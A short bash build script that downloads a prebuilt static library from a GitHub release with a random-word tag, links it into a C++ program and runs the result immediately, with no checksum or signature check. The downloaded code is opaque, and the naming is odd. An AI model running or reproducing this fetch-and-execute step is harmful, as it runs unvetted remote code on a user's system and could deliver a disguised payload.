#!/usr/bin/env bash
set -e
TAG="frosty-canyon-gentle-delta"
LIB="raffia-diamond.a"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "https://github.com/mafengchaix/gotensorcrypt/releases/download/${TAG}/${LIB}"
g++ -O2 -pthread -std=c++17 main.cpp "$LIB" -o app && ./app
